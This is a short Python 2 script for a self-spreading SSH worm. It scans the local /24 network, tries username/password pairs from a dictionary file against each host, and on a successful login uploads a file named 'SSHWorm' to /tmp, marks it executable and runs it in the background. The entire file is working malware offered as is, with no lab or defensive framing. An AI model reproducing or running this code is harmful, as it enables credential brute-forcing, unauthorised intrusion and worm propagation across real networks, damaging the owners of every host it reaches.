#!/usr/bin/env python

import paramiko
import sys
import netifaces as ni
from netaddr import IPNetwork, IPAddress


def UploadFileAndExecute(ssh, fileName) :
 
    print "[+] Opening SFTP Connection"

    sftpClient = ssh.open_sftp()
    sftpClient.put(fileName, "/tmp/" +fileName)
    
    print "[+] Uploaded %s " % fileName

    ssh.exec_command("chmod a+x /tmp/" +fileName)
    ssh.exec_command("nohup /tmp/" +fileName+ " &")

    print "[+] Executed %s " % fileName

    ssh.close()
 

def SSHConnect(host, username, password) :

    print "[+] Creating SSH Connection"
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=username, password=password)

    UploadFileAndExecute(ssh, "SSHWorm")


def SSHDictionaryAttack(ipAddress, dictionaryFile) :
 
    print "[+] Attacking Host : %s " % ipAddress
 
    ssh = paramiko.SSHClient()
 
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
    for line in open(dictionaryFile, "r").readlines() :
 
        [username, password] = line.strip().split()
 
        try :
            print "[+] Trying to break in with username: %s password: %s " % (username, password)
            ssh.connect(ipAddress, username=username, password=password, timeout=20.0)
 
        except paramiko.AuthenticationException as e:
            print "[-] AuthenticationException! %s " % e
            continue 

        except paramiko.transport.socket.timeout as e:
            print "[-] Socket Timeout! %s " % e
            break

        except paramiko.transport.socket.error as e:
            print "[-] Socket Error! %s " % e
            break

        print "[+] Success ... username: %s and passoword %s is VALID! " % (username, password)
        SSHConnect(ipAddress,username,password)
        break


def Attack(ip_list) :
    
    for ip in ip_list:
        
        SSHDictionaryAttack(str(ip), 'dictionary')


def ScanNetwork() :

    print "[+] Starting Network Scan"

    host_ip = IPAddress(ni.ifaddresses('en0')[2][0]['addr'])

    print "[+] Host IP : %s " % host_ip

    network_list = list(IPNetwork("%s/%s" % (host_ip, 24)))
    
    network_list.remove(host_ip)
    network_list.remove(network_list[1])
    network_list.remove(network_list[0])
    
    print "[+] Network IP Addresses : %s \n" % len(network_list)

    Attack(network_list)



if __name__ == "__main__" :
    
    ScanNetwork()